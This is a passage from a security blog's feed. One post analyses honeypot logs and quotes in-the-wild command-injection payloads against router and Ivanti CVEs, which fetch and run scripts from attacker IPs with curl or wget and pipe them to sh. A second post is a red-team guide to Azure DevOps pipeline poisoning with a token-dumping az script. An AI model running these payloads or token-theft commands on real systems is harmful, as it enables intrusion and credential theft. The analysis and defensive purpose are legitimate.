&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.netspi.com/blog/technical/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Videos
&lt;ul&gt;
&lt;li&gt;Modern Initial Access and Evasion Tactics: &lt;a href=&#34;https://youtu.be/DyyD48iKsKE&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://youtu.be/DyyD48iKsKE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Desperate Infection Chains:&lt;a href=&#34;https://youtu.be/CwNPP_Xfrts&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://youtu.be/CwNPP_Xfrts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTI
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>Adventures and Accidental Honeypots in Network Infrastructure: Unravelling Internet Shenanigans</title>
      <link>//localhost:1313/articles/2024/05/2024-05-16-adventures-and-accidental-honeypots-in-network-infrastructure-unravelling-internet-shenanigans/</link>
      <pubDate>Thu, 16 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-16-adventures-and-accidental-honeypots-in-network-infrastructure-unravelling-internet-shenanigans/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/welcome.gif&#34; title=&#34;welcome&#34; alt=&#34;welcome&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;welcome&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Hello World! So, I&amp;rsquo;ve been tinkering with network stuff lately, trying to set up some infrastructure.Turns out that in the process, I made a rookie mistake and left a few ports open to the internet! A few months down the line I took a look and to no one’s surprise my server had been bombarded with all sorts of requests. It was receiving a steady stream of traffic, but not the good kind…think of it more as a steady dose of “internet radiation”. Without realising it I had accidentally turned my server into a honeypot.&lt;/p&gt;
&lt;p&gt;So, naturally curious I started digging into my server logs and what I found was equal parts fascinating and alarming. Let&amp;rsquo;s just say there&amp;rsquo;s a lot of shady stuff going on out there, from random bots on the site, directory traversal with known path (/.git/config wink wink), to common network appliance enumeration. You name it, they were trying it.&lt;/p&gt;
&lt;p&gt;But here&amp;rsquo;s where things get interesting: Among all the noise, there are some requests that stand out. Like, seriously weird stuff. It&amp;rsquo;s like people are trying to target anything and everything they can get their hands on.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sample 0:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;And sometimes they are nice enough to actually tell you who they are 🙂&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sample 1:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the looks of this particular request it’s already got some bash looking code in the payload. Let’s convert the URL encoding to make it more readable.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;/cgi-bin/luci/;stok=/locale?form=country&amp;amp;operation=write&amp;amp;country=$(rm -rf *; cd /tmp; wget http://94.156.79.129/tenda.sh; chmod 777 tenda.sh; ./tenda.sh)&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;This resembles a command injection attack on OpenWRT routers running LuCI web interface (/cgi-bin/luci/). After a bit of googling, this actually targets routers vulnerable to CVE-2023-1389 as an initial step to breach the perimeter. Then proceed to download another bash script payload (tenda.sh), set it up and execute the script.&lt;/p&gt;
&lt;p&gt;Unfortunately, at the time of investigation, the hosted script is no longer available. But fear not, Google to the rescue! It looks like someone has already uploaded the script to any.run. This gives us an opportunity to dig deeper into what the attack is capable of.&lt;/p&gt;
&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Content of tenda.sh script.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image9content-of-tendash-script&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image9content-of-tendash-script&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt;redtail binary packed with the late version of UPX 3.94. (3.94 released in 12th May 2017)&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image10redtail-binary-packed-with-the-late-version-of-upx-394-394-released-in-12th-may-2017&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image10redtail-binary-packed-with-the-late-version-of-upx-394-394-released-in-12th-may-2017&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Upon initial inspection, it looks like a script that contacts the C2 server and downloads then executes the payloads in various CPU architectures. Readers with a keen eye may have already spotted that this behaviour is highly similar to the propagation of the infamous Mirai botnet.&lt;/p&gt;
&lt;p&gt;Hexdump functionality on any.run allows us to inspect the payload binary file, which gives us some hints to unpack the executable with UPX. Let’s grab the binary file and dissect it further locally (do this at your own risk, it is highly recommended to deal with malware in an isolated environment).&lt;/p&gt;
&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;UPX unpacking the binary like a charm.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image7upx-unpacking-the-binary-like-a-charm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image7upx-unpacking-the-binary-like-a-charm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Successfully using UPX to unpack the binary. Section headers are also restored.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image6successfully-using-upx-to-unpack-the-binary-section-headers-are-also-restored&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image6successfully-using-upx-to-unpack-the-binary-section-headers-are-also-restored&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image16.png&#34; title=&#34;image16&#34; alt=&#34;image16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Strings from the mips binary with references to further propagation of Mirai Botnet.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image16strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image16strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image14.png&#34; title=&#34;image14&#34; alt=&#34;image14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Strings from the mips binary with references to further propagation of Mirai Botnet.&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image14strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image14strings-from-the-mips-binary-with-references-to-further-propagation-of-mirai-botnet&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Luckily there are no anti-unpacking measures in place for the binary, and UPX has worked flawlessly to recover the original binary executable with all the section headers intact. Armed with the new information from the unpacked binary, it seems to be leveraging SSDP multicast packets to further identify devices on the network using DIAL protocol. The XML soap request seems to contain payload for further exploitation on vulnerable Huawei routers (CVE-2017-17215), which confirms the malware is attributed to Mirai botnet propagation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Sample 2:&lt;/strong&gt; &lt;/p&gt;
&lt;h3&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image5&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image5&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;/api/v1/totp/user-backup-code/../../license/keys-status/;curl http://94.156.79.60/iv.sh | sh || wget -O- http://94.156.79.60/iv.sh | sh;&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Next up is this specimen. This request again resembles a command injection attack. However, this time it’s targeting the Ivanti Connect Secure web component vulnerable to CVE-2024-21887(/api/v1/totp/user-backup-code/), gaining a foothold and then downloading and executing the iv.sh script by piping it to sh(shell command interpreter).&lt;/p&gt;
&lt;p&gt;Again, the hosted script was no longer available at the time of investigation. Fortunately, thanks to the amazing cyber community, someone has also uploaded the sample onto any.run for further analysis.&lt;/p&gt;
&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Content of iv.sh script&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image4content-of-ivsh-script&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image4content-of-ivsh-script&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1-1.png&#34; title=&#34;image1 1&#34; alt=&#34;image1 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;redtail binary packed with the late version of UPX 4.23. Suggesting that the payload was generated fairly recently (4.2.3 released on 27th March 2024)&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image1-1redtail-binary-packed-with-the-late-version-of-upx-423-suggesting-that-the-payload-was-generated-fairly-recently-423-released-on-27th-march-2024&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image1-1redtail-binary-packed-with-the-late-version-of-upx-423-suggesting-that-the-payload-was-generated-fairly-recently-423-released-on-27th-march-2024&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image15.png&#34; title=&#34;image15&#34; alt=&#34;image15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image15image13&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image15image13&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;h6&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image17-1.png&#34; title=&#34;image17 1&#34; alt=&#34;image17 1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image17 1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;em&gt;Strings from the redtail binary with loads of reference to crypto mining operations&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;image17-1image2strings-from-the-redtail-binary-with-loads-of-reference-to-crypto-mining-operations&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#image17-1image2strings-from-the-redtail-binary-with-loads-of-reference-to-crypto-mining-operations&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt;Running this script will again contact the C2 server, downloading and executing a version of binary payload based on the CPU architecture of the compromised device. The name of the binary “redtail” might have given away the type of malware: &lt;em&gt;Cryptominers!&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Inspecting the strings after unpacking the binary also confirms this theory.&lt;/p&gt;
&lt;p&gt;So, what have we learned? There is a lot of noise around the dangers of ports open to the internet when we are talking about cyber security. For some who have yet to open a port(s) and watch what happens this might seem a bit dramatic. However, your exposed services are constantly being targeted by all kinds of attacks! Remediating this issue is simple: place the web service behind some form of proxy or firewall, whether that be at the host, application or cloud level. I like Cloudflare proxy, and I ensure to whitelist the exposed ports to Cloudflare listed proxies IP addresses. Fun fact: you only need to do one of the 15 ranges listed on their website and it will work.&lt;/p&gt;
&lt;p&gt;Until next time! Stay safe out there ;)&lt;/p&gt;
&lt;h2&gt;&lt;figure&gt;
    &lt;img src=&#34;images/x17K5U4.gif&#34; title=&#34;x17K5U4&#34; alt=&#34;x17K5U4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;x17K5U4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;x17k5u4&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#x17k5u4&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;But also, here’s a list of more trivial ones that were picked up:&lt;/p&gt;
&lt;p&gt;[table id=5 /]&lt;/p&gt;
&lt;h2&gt;References:&lt;span class=&#34;absolute -mt-20&#34; id=&#34;references&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#references&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://openwrt.org/docs/guide-user/luci/start&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://openwrt.org/docs/guide-user/luci/start&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.greynoise.io/blog/active-exploitation-attempts-cve-2023-1389-against-tp-link-archer-gigabit-internet-routers&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.greynoise.io/blog/active-exploitation-attempts-cve-2023-1389-against-tp-link-archer-gigabit-internet-routers&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.zerodayinitiative.com/blog/2023/4/21/tp-link-wan-side-vulnerability-cve-2023-1389-added-to-the-mirai-botnet-arsenal&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://answers.microsoft.com/en-us/windows/forum/all/ssdp-messages/ba8f36d0-6b4a-4735-84f9-db25e273c71f&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://answers.microsoft.com/en-us/windows/forum/all/ssdp-messages/ba8f36d0-6b4a-4735-84f9-db25e273c71f&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/43414&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.exploit-db.com/exploits/43414&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21887&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-21887&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://developers.cloudflare.com/fundamentals/concepts/cloudflare-ip-addresses/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://developers.cloudflare.com/fundamentals/concepts/cloudflare-ip-addresses/&lt;/a&gt;&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Poisoning Pipelines: Azure DevOps Edition</title>
      <link>//localhost:1313/articles/2024/05/2024-05-09-poisoning-pipelines-azure-devops-edition/</link>
      <pubDate>Thu, 09 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-09-poisoning-pipelines-azure-devops-edition/</guid>
      <description>
        
        
        &lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pipelinebursting2.gif&#34; title=&#34;pipelinebursting2&#34; alt=&#34;pipelinebursting2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pipelinebursting2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the ever-evolving realm of cloud services, organisations are ditching the headaches of physical infrastructure management and diving headfirst into the possibilities of cloud platforms. From the humble beginnings of deploying virtual machines and servers, we now find ourselves in a dynamic space with everything from serverless architectures to cloud-based active directories, seamless SaaS integrations, architectural blueprints, collaboration tools, AI assistants, and more.&lt;/p&gt;
&lt;p&gt;However, one core business service has been housed in the cloud longer than most: Continuous Integration / Continuous Deployment (CI/CD). The reasons are clear: there is no better use case for high availability containerised and serverless operations than a CI/CD pipeline.&lt;/p&gt;
&lt;p&gt;From a red teamer&amp;rsquo;s perspective CI/CD pipelines are also extremely valuable targets as they often underpin the production code base that, in most cases, underpins the organisation&amp;rsquo;s core business function itself. As such, many of the cloud-native red team engagements that we deliver will focus on the compromise of the CI/CD as one of the engagement objectives.&lt;/p&gt;
&lt;p&gt;This blog summarises some of our thinking with regards to compromising DevOps pipelines on your red team engagements. For now we will be focusing on Azure DevOps due to the fact that historically the majority of our work has been in Azure environments, but we are seeing more and more AWS and GCP estates now too so we may release future versions of this. That being said, the philosophy behind compromising CI/CD and attack scenarios mentioned in this article are common across the board.&lt;/p&gt;
&lt;h3&gt;Azure DevWho?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure-devwho&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure-devwho&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Azure DevOps is a Microsoft toolkit running in the cloud, aimed at streamlining the process of creating software using a CI/CD model. It bundles services for tracking work, managing code, automating builds and tests, and sharing software packages. But more importantly, &lt;strong&gt;it runs user-defined code&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;Initial Foothold&lt;span class=&#34;absolute -mt-20&#34; id=&#34;initial-foothold&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#initial-foothold&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Once a foothold in the cloud tenant has been established via phishing, compromising an external application or assumed breach, the standard cyber kill-chain can be followed to enumerate services, move laterally, escalate privileges and mine data.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/cloud_killchain.png&#34; title=&#34;Your favourite cloud killchain diagram&#34; alt=&#34;Your favourite cloud killchain picture&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Your favourite cloud killchain diagram&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Using tools like Road Tools, AzureHound, msportals.io and the Azure CLI you may begin the discovery process to identify what services are in use. Crucially, keep your eyes open for DevOps services.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/msportals.png&#34; title=&#34;msportals.io - you can look up any microsoft portal from here&#34; alt=&#34;msportals.io - you can look up any microsoft portal from here&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;msportals.io - you can look up any microsoft portal from here&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You may find that in some cases that permissions to Azure DevOps are not as locked down as you might expect. This is ultimately due to how complex granular IAM permissions can become in larger cloud estates. For example, we have found lower privileged users had write permissions to certain non-production pipelines despite not being in technical roles.&lt;/p&gt;
&lt;h3&gt;But…Least Privilege?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;butleast-privilege&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#butleast-privilege&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Although not part of their day-to-day tasks, users that are not strictly developers may still present no restrictions in modifying, creating, deploying and executing code within the Azure DevOps pipeline. This behaviour is often not intentional but the result of overlooked permission assignments. In fact, over privileged IAM assignments is something that we regularly see in cloud environments due to the sheer number of IAM roles available. Critical permissions such as these are often overlooked, leading to users having the capability to read historical code commits, sometimes going back a few years! These can be a treasure trove for us red teamers as security may have been less of a priority back then and you may be more likely to find hardcoded credentials in older code.&lt;/p&gt;
&lt;p&gt;If you find yourself having successfully phished a member of staff that has access to Azure DevOps, review the permissions that users have to DevOps services offered by Azure. Your first thoughts at this stage should be to check whether you can:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edit repositories&lt;/li&gt;
&lt;li&gt;read history of commits (a treasure trove, believe me) or previously pushed code repositories&lt;/li&gt;
&lt;li&gt;enumerate other Azure services the organisation is using&lt;/li&gt;
&lt;li&gt;steal service accounts or managed identities associated with the DevOps service&lt;/li&gt;
&lt;li&gt;possibly introduce malware to the pipeline to enable more lateral movement and privilege escalation techniques&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Pipeline Runners&lt;span class=&#34;absolute -mt-20&#34; id=&#34;pipeline-runners&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#pipeline-runners&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Code checking agents are regularly used in CI/CD pipelines as part of the build process to ensure that the supplied code is running correctly and works as intended. They are compute resources with agent software installed that run tests on your code. They ensure that the infrastructure, resources, and dependencies required to run your code are present. Crucially, they can be seen as ephemeral virtual machines from the attacker perspective.&lt;/p&gt;
&lt;p&gt;If you find yourself in a position where you can push code to a pipeline, you are now in a position to poison it. Remember, pipeline running agents execute arbitrary &lt;em&gt;user-supplied code.&lt;/em&gt; That smells like RCE to me! Note, pushing arbitrary code to operational pipelines is not the play here. Instead, try to create your own branch or look for test branches. Always clear this with the client before proceeding! It’s important that we stress this point because at this stage you will need to proceed with extra caution as you may be interfering with production services. So please, if you are on an engagement, ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;⚠️  &lt;em&gt;always ensure you gain the right authorisation from the target organisation before proceeding with creating branches or applying changes to the pipeline environment&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Where you go from here is limited only by your creativity. In our case, we use these RCEs to reach out to attacker-controlled infrastructure and pull down a C2 implant suitable for the target architecture. As a bonus, these machines rarely have security products on them as they are ephemeral by nature (we’ll get to how to maintain persistent access to these machines later)&lt;/p&gt;
&lt;p&gt;Now this may start to feel more like a traditional red team, but unlike a traditional red team your focus should be on compromising the identity of that agent. That is to say, you can try to steal the pipeline agent’s identity used by Azure, or any other cloud provider for that matter. These will often have service principal identities associated with them in Azure to perform actions.&lt;/p&gt;
&lt;p&gt;Some options with regards to stealing the tokens include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Requesting the tokens using az cli (from the perspective of the code agent).&lt;/li&gt;
&lt;li&gt;Metadata service&lt;/li&gt;
&lt;li&gt;Environment variables&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The above can be achieved by either entering the code in the code commit or by obtaining a reverse shell from the ephemeral virtual environment used by the code running agent.&lt;/p&gt;
&lt;p&gt;Having now compromised that service principal, it should be easy to review whether they have read/write permissions over other services in Azure resource manager (ARM).&lt;/p&gt;
&lt;p&gt;To summarise, if you can write to the repository code that is run by the code running agents, you can leverage the agent’s service principal identity to enumerate resources within the Azure environment as them, and mostly undetected.&lt;/p&gt;
&lt;p&gt;If this works, it would effectively mean pivoting from your initial Azure user identity to a service principal identity for lateral movement.&lt;/p&gt;
&lt;p&gt;Now what do you do? Well, below we will explore different options here such as automating the process of discovering assets like storage accounts, keyvaults, CosmosDB databases, and so on.&lt;/p&gt;
&lt;h3&gt;The path to El-Dorado&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-path-to-el-dorado&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-path-to-el-dorado&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Having now compromised the identity associated with a code checking agent you can start looking for ways to escalate privileges, move laterally or demonstrate business impact. My favourite approach would be to steal credentials and connection strings to find a route to more business critical environments.&lt;/p&gt;
&lt;p&gt;In previous engagements we have used this to retrieve:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Access and Refresh Tokens.&lt;/li&gt;
&lt;li&gt;Environmental variables belonging to the code build running agent.&lt;/li&gt;
&lt;li&gt;Storage Account connection strings.&lt;/li&gt;
&lt;li&gt;CosmosDB and Mongo databases and their connection strings.&lt;/li&gt;
&lt;li&gt;Keyvaults and the secrets they stored.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Wondering what this might look like in real terms? The following are some code examples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Enumerate the service principal account and fetch tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;az account list
echo &amp;#34;----Collecting Tokens-----&amp;#34;
echo token
az account get-access-token
echo aadgraphtoken
az account get-access-token --resource-type aad-graph
echo armtoken
az account get-access-token --resource-type arm
echo batchtoken
az account get-access-token --resource-type batch
echo datalake token
az account get-access-token --resource-type data-lake
echo ms-graphtoken
az account get-access-token --resource-type ms-graph&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
